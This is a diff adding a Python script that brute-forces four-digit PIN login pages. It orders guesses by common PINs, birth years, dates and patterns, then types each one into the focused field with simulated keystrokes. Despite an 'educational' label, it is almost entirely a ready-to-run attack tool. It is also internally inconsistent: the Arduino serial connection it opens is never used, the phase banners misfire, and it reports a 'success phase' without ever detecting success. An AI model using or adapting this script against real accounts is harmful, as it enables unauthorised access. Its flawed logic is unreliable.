@@ -1,0 +1,271 @@
+#!/usr/bin/env python3
+"""
+Advanced Arduino Brute Force - Smart PIN Selection
+===================================================
+
+This enhanced version tries common PINs first, dramatically 
+reducing the average time to crack.
+
+Based on research showing most people choose predictable PINs:
+- Birth years (1960-2025)
+- Repeated digits (1111, 2222)
+- Sequential patterns (1234, 4321)
+- Common dates (0101, 1225)
+
+Educational demonstration showing why PIN predictability is dangerous.
+"""
+
+from pynput.keyboard import Controller, Key
+import serial
+import serial.tools.list_ports
+import time
+import sys
+
+# ============ CONFIGURATION ============
+BAUD_RATE = 9600
+DELAY_BETWEEN_DIGITS = 0.15
+DELAY_AFTER_ENTER = 3.0
+# =======================================
+
+# Most common 4-digit PINs based on real-world data breaches
+COMMON_PINS = [
+    # Top 20 most common PINs
+    '1234', '1111', '0000', '1212', '7777', '1004',
+    '2000', '4444', '2222', '6969', '9999', '3333',
+    '5555', '6666', '1122', '1313', '8888', '4321',
+    '2001', '1010',
+    
+    # Birth years (recent)
+    '2024', '2023', '2022', '2021', '2020', '2019',
+    '2018', '2017', '2016', '2015', '2010', '2005',
+    
+    # Birth years (1980s-2000s)
+    '1990', '1991', '1992', '1993', '1994', '1995',
+    '1996', '1997', '1998', '1999', '2000',
+    '1980', '1981', '1982', '1983', '1984', '1985',
+    '1986', '1987', '1988', '1989',
+    
+    # Dates (MMDD format)
+    '0101', '0102', '0214', '0317', '0704', '1031',
+    '1111', '1201', '1225', '1231',
+]
+
+def generate_pattern_pins():
+    """Generate PINs with common patterns"""
+    patterns = []
+    
+    # Repeated digits (1111, 2222, etc.)
+    for digit in range(10):
+        pin = str(digit) * 4
+        if pin not in COMMON_PINS:
+            patterns.append(pin)
+    
+    # Sequential ascending (0123, 1234, etc.)
+    for start in range(7):
+        pin = ''.join(str(start + i) for i in range(4))
+        if pin not in COMMON_PINS:
+            patterns.append(pin)
+    
+    # Sequential descending (3210, 4321, etc.)
+    for start in range(3, 10):
+        pin = ''.join(str(start - i) for i in range(4))
+        if pin not in COMMON_PINS:
+            patterns.append(pin)
+    
+    # Alternating patterns (0101, 1010, etc.)
+    for a in range(10):
+        for b in range(10):
+            if a != b:
+                pin = f"{a}{b}{a}{b}"
+                if pin not in COMMON_PINS and pin not in patterns:
+                    patterns.append(pin)
+    
+    return patterns
+
+def generate_smart_pin_list():
+    """
+    Generate comprehensive PIN list with smart ordering:
+    1. Common PINs first
+    2. Pattern-based PINs
+    3. Remaining PINs sequentially
+    """
+    tested_pins = set()
+    pin_list = []
+    
+    # Phase 1: Common PINs
+    print("\n📊 Generating smart PIN list...")
+    for pin in COMMON_PINS:
+        if pin not in tested_pins:
+            pin_list.append(pin)
+            tested_pins.add(pin)
+    print(f"   Phase 1: {len(pin_list)} common PINs")
+    
+    # Phase 2: Pattern PINs
+    pattern_pins = generate_pattern_pins()
+    for pin in pattern_pins:
+        if pin not in tested_pins:
+            pin_list.append(pin)
+            tested_pins.add(pin)
+    print(f"   Phase 2: {len(pin_list) - len(COMMON_PINS)} pattern PINs")
+    
+    # Phase 3: Sequential brute force
+    start_count = len(pin_list)
+    for i in range(10000):
+        pin = f"{i:04d}"
+        if pin not in tested_pins:
+            pin_list.append(pin)
+            tested_pins.add(pin)
+    print(f"   Phase 3: {len(pin_list) - start_count} sequential PINs")
+    print(f"   Total: {len(pin_list)} PINs\n")
+    
+    return pin_list
+
+def find_arduino():
+    """Auto-detect Arduino COM port"""
+    print("[1] 🔍 Searching for Arduino...")
+    ports = serial.tools.list_ports.comports()
+    
+    if not ports:
+        print("    ❌ No COM ports found!")
+        return None
+    
+    print("    📋 Available ports:")
+    for port in ports:
+        print(f"       • {port.device} - {port.description}")
+        if any(kw in port.description.upper() for kw in ['ARDUINO', 'CH340', 'CH341', 'USB-SERIAL']):
+            print(f"    ✅ Arduino detected: {port.device}\n")
+            return port.device
+    
+    return None
+
+def main():
+    print("=" * 70)
+    print("        ADVANCED ARDUINO BRUTE FORCE - SMART ATTACK")
+    print("=" * 70)
+    print("\n⚠️  EDUCATIONAL PURPOSE ONLY - Test on your own systems!")
+    print("   This version tries common PINs first for faster cracking.\n")
+    
+    # Find Arduino
+    arduino_port = find_arduino()
+    if not arduino_port:
+        arduino_port = input("Enter COM port manually (e.g., COM3): ").strip().upper()
+        if not arduino_port.startswith("COM"):
+            arduino_port = "COM" + arduino_port
+    
+    # Connect to Arduino
+    print(f"[2] 🔌 Connecting to {arduino_port}...")
+    try:
+        ser = serial.Serial(arduino_port, BAUD_RATE, timeout=1)
+        print(f"    ✅ Connected!")
+    except serial.SerialException as e:
+        print(f"    ❌ Failed: {e}")
+        input("\nPress Enter to exit...")
+        sys.exit(1)
+    
+    # Wait for Arduino
+    print("\n[3] ⏳ Waiting for Arduino...")
+    time.sleep(3)
+    ser.reset_input_buffer()
+    
+    # Generate smart PIN list
+    smart_pins = generate_smart_pin_list()
+    
+    # Initialize keyboard
+    keyboard = Controller()
+    
+    # Preparation
+    print("=" * 70)
+    print("                  🎯 ATTACK PREPARATION")
+    print("=" * 70)
+    print("\n📢 INSTRUCTIONS:")
+    print("   1. Open your LOGIN PAGE in browser")
+    print("   2. CLICK on the PIN INPUT FIELD")
+    print("   3. Countdown starts in 3 seconds...\n")
+    
+    for i in range(10, 0, -1):
+        print(f"   ⏰ Starting in {i}...", end='\r')
+        time.sleep(1)
+    
+    print("\n\n" + "=" * 70)
+    print("              ⚡ SMART ATTACK IN PROGRESS ⚡")
+    print("=" * 70)
+    print("\n🧠 Using intelligent PIN selection:")
+    print("   Phase 1: Common PINs (birth years, patterns)")
+    print("   Phase 2: Sequential brute force")
+    print("\n💡 Press Ctrl+C to stop\n")
+    print("-" * 70)
+    
+    # Attack
+    attempt = 0
+    start_time = time.time()
+    phase = "Common PINs"
+    
+    try:
+        for pin in smart_pins:
+            attempt += 1
+            
+            # Update phase
+            if attempt == len(COMMON_PINS) + 1:
+                phase = "Pattern PINs"
+                print("\n" + "=" * 70)
+                print("   📊 Phase 2: Testing pattern-based PINs...")
+                print("=" * 70 + "\n")
+            elif attempt > len(COMMON_PINS) + len(generate_pattern_pins()):
+                phase = "Sequential"
+                print("\n" + "=" * 70)
+                print("   🔢 Phase 3: Sequential brute force...")
+                print("=" * 70 + "\n")
+            
+            elapsed = time.time() - start_time
+            rate = attempt / elapsed if elapsed > 0 else 0
+            
+            # Progress
+            print(f"[{attempt:05d}] 🔑 {phase:15} | PIN: {pin} | "
+                  f"Speed: {rate:.2f}/sec | Time: {elapsed:.0f}s")
+            
+            # Type PIN
+            for digit in pin:
+                keyboard.type(digit)
+                time.sleep(DELAY_BETWEEN_DIGITS)
+            
+            # Enter
+            keyboard.press(Key.enter)
+            keyboard.release(Key.enter)
+            
+            # Wait
+            time.sleep(DELAY_AFTER_ENTER)
+    
+    except KeyboardInterrupt:
+        print("\n\n⚠️  Attack stopped by user (Ctrl+C)")
+    
+    finally:
+        ser.close()
+        
+        # Statistics
+        elapsed = time.time() - start_time
+        print("\n" + "=" * 70)
+        print("                  📊 ATTACK STATISTICS")
+        print("=" * 70)
+        print(f"   Total attempts:     {attempt:,}")
+        print(f"   Time elapsed:       {elapsed/60:.2f} minutes")
+        print(f"   Average speed:      {attempt/elapsed if elapsed > 0 else 0:.2f} PINs/sec")
+        print(f"   Success phase:      {phase}")
+        print("=" * 70)
+        
+        print("\n💡 Security Insight:")
+        if attempt <= len(COMMON_PINS):
+            print("   ⚠️  DANGER: PIN was in top common list!")
+            print("   This is why predictable PINs are extremely unsafe.")
+        elif attempt <= len(COMMON_PINS) + len(generate_pattern_pins()):
+            print("   ⚠️  Pattern-based PIN found quickly.")
+            print("   Avoid sequential or repeated digit patterns.")
+        else:
+            print("   ✓ PIN required sequential search.")
+            print("   Random PINs are more secure than common ones.")
+        
+        print("\n🛡️  Defense: Use random, long passwords with MFA!\n")
+        
+        input("Press Enter to exit...")
+
+if __name__ == "__main__":
+    main()
